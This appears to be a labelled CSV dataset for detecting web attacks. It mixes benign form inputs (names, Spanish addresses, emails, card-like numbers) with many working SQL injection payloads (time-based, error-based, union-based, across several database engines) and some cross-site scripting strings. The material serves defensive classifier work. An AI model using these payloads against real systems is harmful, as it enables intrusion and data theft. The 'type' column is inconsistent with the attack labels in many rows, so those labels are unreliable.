Text,attack_type,Label,type
-5291')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('tmpm'='tmpm,sqli,1,sql
-1879%')) or 3038=3038,sqli,1,normal
16812,norm,0,normal
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
1%')) order by 1--,sqli,1,sql
pierpoint@youtubed.sh,norm,0,normal
"calle alonso nuez 186, 12?b",norm,0,normal
"1"")) and make_set(8403=8403,8899) and ((""nsyl""=""nsyl",sqli,1,normal
"1) where 9012=9012 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
ibias,norm,0,normal
madrigalesco,norm,0,normal
"calle nueva de arriba, 111 9g",norm,0,normal
litago,norm,0,normal
"1"";select count(*) from generate_series(1,5000000) and ""ihbe"" like ""ihbe",sqli,1,sql
"1')) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
7994,norm,0,normal
"1%')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'='",sqli,1,sql
legarza gambin,norm,0,normal
0992218178104844,norm,0,normal
c/ san antonio 65 12?a,norm,0,normal
"1"" and 8407=(select count(*) from generate_series(1,5000000))",sqli,1,sql
"1"") where 7548=7548;select sleep(5)--",sqli,1,sql
"-8409%') or make_set(9354=9354,7185) and ('%'='",sqli,1,normal
"1"") as xsgx where 5239=5239 union all select null,null--",sqli,1,sql
scriptalert(crosssitescripting)/script,xss,2,normal
querol jopia,norm,0,normal
corencia_beranger@100mbps.is,norm,0,normal
pipiolo sandrini,norm,0,normal
de martino valds,norm,0,normal
20491,norm,0,normal
1' in boolean mode) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#,sqli,1,sql
6273470389160924,norm,0,normal
2293,norm,0,normal
7785029270305483,norm,0,normal
1'));(select * from (select(sleep(5)))acdk)#,sqli,1,sql
"1' in boolean mode) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",sqli,1,sql
"1%"")) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1' in boolean mode);select (case when (1275=7674) then 1275 else 1275*(select 1275 from information_schema.character_sets) end)#,sqli,1,sql
0esh6red32,norm,0,normal
inescourt7@citycvs.mil,norm,0,normal
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",sqli,1,sql
keehn,norm,0,normal
finney,norm,0,normal
5718,norm,0,normal
"-4641"") where 4212=4212 or make_set(3595=4062,4062)--",sqli,1,sql
pifiar,norm,0,normal
03158,norm,0,normal
belkis,norm,0,normal
lombarda otago,norm,0,normal
caballillo,norm,0,normal
4405692863089329,norm,0,normal
"c/ tomillar, 54, 1-e",norm,0,normal
"1%""));select case when 5308=6745 then 1 else null end--",sqli,1,sql
hinkie@goovitae.pg,norm,0,normal
2esco63enti2,norm,0,normal
casiana,norm,0,normal
"1"";begin user_lock.sleep(5); end",sqli,1,sql
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""dnlz""=""dnlz",sqli,1,normal
nineteen@drivinn.int,norm,0,normal
enio,norm,0,normal
"1') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#",sqli,1,sql
montiel@sitienesunawebtienesunnegocio.cf,norm,0,normal
caamao alayo,norm,0,normal
"-4745"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""nifq"" like ""nifq",sqli,1,sql
"glorieta valle de oro, 9 10a",norm,0,normal
1%');select (case when (9986=8342) then 9986 else 9986*(select 9986 from information_schema.character_sets) end)#,sqli,1,sql
emblanquimiento,norm,0,normal
pavor,norm,0,normal
santos,norm,0,normal
"el naranjo, s/n 5f",norm,0,normal
86,norm,0,normal
sedano montanyola,norm,0,normal
"1 where 1153=1153 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
"1 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
oman,norm,0,normal
"-1634%' union all select 5937,5937,5937,5937--",sqli,1,sql
1) where 2468=2468 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
mallejac,norm,0,normal
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('swfj' like 'swfj",sqli,1,sql
del cid labastie,norm,0,normal
"c/ domingo de betanzos s/n,",norm,0,normal
"calle periodista fray antonio de la chica, s/n 9e",norm,0,normal
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813",sqli,1,sql
"calle serbal, 190,",norm,0,normal
"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (4959=4959",sqli,1,normal
arqu rocas,norm,0,normal
7496121103658289,norm,0,normal
"1%"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""%""=""",sqli,1,sql
co2posi9or,norm,0,normal
murillo el cuende,norm,0,normal
"1 where 1776=1776 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
aceitn,norm,0,normal
"1',iif(9496=4153,1,1/0)",sqli,1,normal
lacey@bwds.mp,norm,0,normal
"1') as sjzi where 8242=8242 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
fulgencio,norm,0,normal
07831245k,norm,0,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
42315,norm,0,normal
-9393' where 3119=3119 or 8571=8571--,sqli,1,sql
8049477483692914,norm,0,normal
50138,norm,0,normal
medwin-whittinghill@enla.th,norm,0,normal
bowen-gugolka@soyriojano.name,norm,0,normal
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""bnyh""=""bnyh",sqli,1,normal
"1%'));iif(5257=5257,1,1/0)",sqli,1,sql
"-4826 union all select 4532,4532,4532,4532,4532--",sqli,1,sql
fournier,norm,0,normal
dohanos_boulting@am-si.zw,norm,0,normal
"1'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"1') where 7391=7391 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
impenetr-abilidad,norm,0,normal
weiner,norm,0,normal
"1"") where 9093=9093;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
-5031' or 9323=9323#,sqli,1,normal
"1)) and elt(9288=6067,6067) and ((1895=1895",sqli,1,normal
"1'||(select 'blvu' from dual where 9813=9813;select count(*) from generate_series(1,5000000))||'",sqli,1,sql
8012,norm,0,normal
"-4970') union all select 4625,4625,4625,4625,4625,4625,4625,4625#",sqli,1,sql
35210254z,norm,0,normal
">""<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",xss,2,xss
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
evin,norm,0,normal
"1"")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--",sqli,1,sql
1' in boolean mode);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
1%'))) and sleep(5)#,sqli,1,normal
"-2948')) or make_set(9354=9354,7185) and (('ivwt'='ivwt",sqli,1,normal
7919,norm,0,normal
enrico,norm,0,normal
barcario,norm,0,normal
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)# usus",sqli,1,normal
abla,norm,0,normal
palacn aucapia,norm,0,normal
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""vabm""=""vabm",sqli,1,sql
keseris,norm,0,normal
86064216x,norm,0,normal
sar2384g0,norm,0,normal
"-6125'||(select 'hwnm' where 1428=1428 union all select 1428,1428,1428,1428,1428,1428#",sqli,1,sql
-9191') as qtvm where 2838=2838 or (8459=8459)*4906--,sqli,1,sql
"1) where 1270=1270 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
ferreras de arriba,norm,0,normal
calaceite,norm,0,normal
cigea,norm,0,normal
"1"");waitfor delay '0:0:5' and (""ludp"" like ""ludp",sqli,1,sql
"carretera de vista-rica s/n,",norm,0,normal
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""bfko""=""bfko",sqli,1,sql
50709909s,norm,0,normal
racette,norm,0,normal
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",sqli,1,sql
46562846j,norm,0,normal
30573468m,norm,0,normal
"pego, el",norm,0,normal
34309,norm,0,normal
-8521'+(select ucim where 9003=9003 union all select 9003--,sqli,1,sql
"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",xss,2,sql
1%');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
copa,norm,0,normal
"'""--></style></script><script>alert('xss')</script>",xss,2,xss
proftica,norm,0,normal
"-5386') union all select 8026,8026,8026,8026,8026,8026#",sqli,1,sql
cangalaya,norm,0,normal
en546al,norm,0,normal
laticfero,norm,0,normal
"1%"");begin user_lock.sleep(5); end--",sqli,1,sql
arseniato,norm,0,normal
3311,norm,0,normal
3e43a01n8,norm,0,normal
arlota,norm,0,normal
70385522w,norm,0,normal
-7726 or 3038=3038,sqli,1,normal
clodomiro,norm,0,normal
"1"") and (5452=6050)*6050 and (""ciyc"" like ""ciyc",sqli,1,normal
3153195738365975,norm,0,normal
25748,norm,0,normal
transbordar,norm,0,normal
-9225) or (8258=2726)*2726 and (9900=9900,sqli,1,normal
sikander,norm,0,normal
juzbado,norm,0,normal
yoon-mo,norm,0,normal
"calle diseminado hornos de rey 29, 7?b",norm,0,normal
8id4o52ti97,norm,0,normal
82768054r,norm,0,normal
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""%""=""",sqli,1,sql
morandy bosquet,norm,0,normal
28530,norm,0,normal
barco montull,norm,0,normal
vieta,norm,0,normal
re53nc19g93s8,norm,0,normal
janet,norm,0,normal
"1') or elt(5873=5873,sleep(5))#",sqli,1,normal
aparencia,norm,0,normal
noris,norm,0,normal
"1%""));begin dbms_lock.sleep(5); end and ((""%""=""",sqli,1,sql
"1"" and elt(8464=5761,5761) and ""ydmt"" like ""ydmt",sqli,1,normal
entrepalmadura,norm,0,normal
"-3059 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
"<a href=""javascript#alert('xss');"">",xss,2,sql
"1%"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""%""=""",sqli,1,sql
"-4093')) union all select 5785,5785,5785#",sqli,1,sql
strade_rosenthal@latiendadecolchones.kr,norm,0,normal
g!arbn,norm,0,normal
43751883h,norm,0,normal
72484997z,norm,0,normal
augusto,norm,0,normal
jana,norm,0,normal
"-1630' union all select 1971,1971--",sqli,1,sql
kepekci,norm,0,normal
sanderson@todobetis.ml,norm,0,normal
29142280s,norm,0,normal
kiyohara,norm,0,normal
"-3518) union all select 1877,1877,1877,1877#",sqli,1,sql
kinamon,norm,0,normal
3816140055742895,norm,0,normal
4646925880970082,norm,0,normal
empa.etar,norm,0,normal
viriato,norm,0,normal
calle castropol 11,norm,0,normal
7137970068268248,norm,0,normal
-2351)) as xdqn where 4019=4019 or 8571=8571--,sqli,1,sql
de47aducha,norm,0,normal
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('iuki'='iuki,sqli,1,sql
43470,norm,0,normal
"1 and 8407=(select count(*) from generate_series(1,5000000))-- zozj",sqli,1,sql
escultrico,norm,0,normal
7671154062280390,norm,0,normal
"-1302"")) as rshr where 2800=2800 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
crous zuta,norm,0,normal
6194,norm,0,normal
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('qtul' like 'qtul,sqli,1,sql
merriell,norm,0,normal
4l09o636a,norm,0,normal
gubern jalmar,norm,0,normal
5408940503153342,norm,0,normal
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'='",sqli,1,sql
frydtberg@archivodeimagenes.cat,norm,0,normal
22860,norm,0,normal
"1) where 8008=8008 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1%"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""%""=""",sqli,1,sql
07260,norm,0,normal
"el hosquillo s/n, 5d",norm,0,normal
"juan de grijalba, 23",norm,0,normal
"cami can rabella, s/n",norm,0,normal
arrestar,norm,0,normal
"c/jon habana, 111",norm,0,normal
"c/ dau 100, 10-a",norm,0,normal
mcavoy-zabczynski@discotecateatre.gt,norm,0,normal
f4lf7,norm,0,normal
16522,norm,0,normal
llobet garrido,norm,0,normal
"1'||(select 'mzhj' where 9677=9677 union all select null,null,null--",sqli,1,sql
"-1<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",xss,2,xss
-4900')) or 7208=3236,sqli,1,normal
3053383097473695,norm,0,normal
marven,norm,0,normal
"-2384'||(select 'vhcp' from dual where 1266=1266 union all select 1266,1266,1266,1266--",sqli,1,sql
"<img src=javascript:alert(""crosssitescripting"")>"";' >",xss,2,xss
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""snwx"" like ""snwx",sqli,1,sql
1);select pg_sleep(5),sqli,1,sql
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""",sqli,1,sql
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('fbsi' like 'fbsi",sqli,1,sql
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'lckw'='lckw",sqli,1,sql
serret@sierradealcaraz.dj,norm,0,normal
919,norm,0,normal
llanera,norm,0,normal
c5fra98,norm,0,normal
8781173513237509,norm,0,normal
list-style:url() onerror=alert(1)></li>,xss,2,xss
-9087 or 3038=3038,sqli,1,normal
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",sqli,1,sql
kootenay.ramos@mayoriasilenciosa.bi,norm,0,normal
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs",sqli,1,sql
37246,norm,0,normal
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7182=7182",sqli,1,normal
ayca mols,norm,0,normal
equivalentemente,norm,0,normal
96110447w,norm,0,normal
</script></script><<<<script><>>>><<<script>alert(xss)</script>,xss,2,xss
calle espiel 71,norm,0,normal
gregonio,norm,0,normal
"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",sqli,1,sql
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""prtf"" like ""prtf",sqli,1,sql
anariva estradera,norm,0,normal
"-3364%""))) union all select 5464--",sqli,1,sql
19115,norm,0,normal
"-2979')) as klou where 7092=7092 union all select 7092,7092--",sqli,1,sql
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
"1%'))) union all select null,null,null,null,null,null#",sqli,1,sql
"-2007%')) union all select 7298,7298,7298#",sqli,1,sql
homs breither,norm,0,normal
"1%"")) or elt(6272=6272,sleep(5)) and ((""%""=""",sqli,1,normal
taneda@ajuntamentdebcn20.be,norm,0,normal
1an0re5354,norm,0,normal
3723526931599696,norm,0,normal
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# dwxl",sqli,1,sql
8616893539725531,norm,0,normal
roger,norm,0,normal
04277567g,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
5370,norm,0,normal
ar$a,norm,0,normal
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'wjwn'='wjwn",sqli,1,sql
5986,norm,0,normal
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('ndhn' like 'ndhn",sqli,1,sql
"1'||(select 'setd' from dual where 3686=3686 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",sqli,1,sql
latin,norm,0,normal
70892292j,norm,0,normal
"1 where 1062=1062 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"torre, la",norm,0,normal
-5569') as cjaf where 3753=3753 union all select 3753#,sqli,1,sql
tas9go,norm,0,normal
"c/ alcaices, 23",norm,0,normal
6190977702118960,norm,0,normal
1')) as fqia where 1936=1936 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
2869539552329733,norm,0,normal
"-8686"" where 4532=4532 or elt(3301=9065,9065)--",sqli,1,sql
lanae,norm,0,normal
"c/ forjadores, 131",norm,0,normal
"1)) as khvx where 7533=7533 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
"1"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
tejera,norm,0,normal
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"alqueria de pixarroda, 27",norm,0,normal
